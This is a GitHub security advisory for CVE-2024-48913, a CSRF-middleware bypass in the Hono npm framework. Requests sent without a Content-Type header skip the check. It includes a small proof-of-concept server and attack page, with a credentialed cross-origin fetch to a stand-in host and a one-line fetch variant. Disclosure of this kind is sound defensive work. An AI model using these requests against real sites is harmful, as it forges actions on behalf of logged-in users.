# [M] Hono allows bypass of CSRF Middleware by a request without Content-Type header.

## Summary
Severity: Medium
Advisory: GHSA-2234-fmw7-43wr
CVE: CVE-2024-48913
CWE: CWE-352
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2024-10-15
Source: https://github.com/advisories/GHSA-2234-fmw7-43wr
Type: github-advisory

## Affected
- npm: `hono` — affected >=0 <4.6.5

## Details
### Summary
Bypass CSRF Middleware by a request without Content-Type herader.

### Details
Although the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.

https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89

### PoC
```server.js
// server.js
import { Hono } from 'hono'
import { csrf }from 'hono/csrf'
const app = new Hono()
app.use(csrf())
app.get('/', (c) => {
  return c.html('Hello Hono!')
})
app.post('/', async (c) => {
  console.log("executed")
  return c.text( await c.req.text())
})
Deno.serve(app.fetch)
```

```poc.html
<!-- PoC.html -->
<script>
async function myclick() {
    await fetch("http://evil.example.com", {
    method: "POST",
    credentials: "include",
    body:new Blob([`test`],{}),
    });
}
</script>
<input type="button" onclick="myclick()" value="run" />
```

Similarly, the fetch API does not add a Content-Type header for requests that do not include a Body.
```PoC2.js
await fetch("http://localhost:8000", { method: "POST", credentials: "include"});
```

### Impact
Bypass csrf protection implemented with hono csrf middleware.

## References
- https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr
- https://nvd.nist.gov/vuln/detail/CVE-2024-48913
- https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82
- https://github.com/honojs/hono
- https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89
